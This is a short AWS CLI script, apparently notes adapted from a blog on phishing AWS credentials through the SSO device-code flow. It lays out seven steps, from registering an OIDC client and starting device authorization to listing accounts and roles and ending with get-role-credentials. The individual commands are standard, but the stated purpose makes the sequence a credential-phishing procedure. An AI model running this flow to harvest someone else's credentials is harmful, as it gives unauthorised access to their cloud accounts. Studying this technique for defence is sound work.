#exemplo adaptado de https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/

#STEP 1 - get client-id and client-secret
aws sso-oidc register-client --client-name client-1 --client-type public --region us-east-1 

#STEP 2 - get a device authorization for login via sso 
aws sso-oidc start-device-authorization \
--client-id [client-id from step 1] \
--client-secret [client-secret from step 1] \
--start-url $START_URL \
--region us-east-1




#STEP 3 - generate a device-token and token for login via SSO (autentication and authorizarion must be done by web browser from
#URL generate from STEP 2)

#STEP 4 - get a token adter authorization from STEP 3
aws sso-oidc create-token \
--client-id [client-id from step 1] \
--client-secret [client-secret from step 1] \
--grant-type urn:ietf:params:oauth:grant-type:device_code \
--device-code [device-code from step 2] \
--code [code from step 2] \
--region us-east-1

#STEP 5 - get the accounts list
aws sso list-accounts \
--access-token [access-token from step 4] \
--region us-east-1

#STEP 6 - tet roles list associated to an account
aws sso list-account-roles \
--access-token [access-token from step 4] \
--account-id [account-id from step 4] \
--region us-east-1

#STEP 7 - get credentias from as specific role from an specific account to be able to call aws services from account
aws sso get-role-credentials \
--role-name [role-name from step 6] \
--account-id [account-id from step 4] \
--access-token [access-token from step 4]  \
--region us-east-1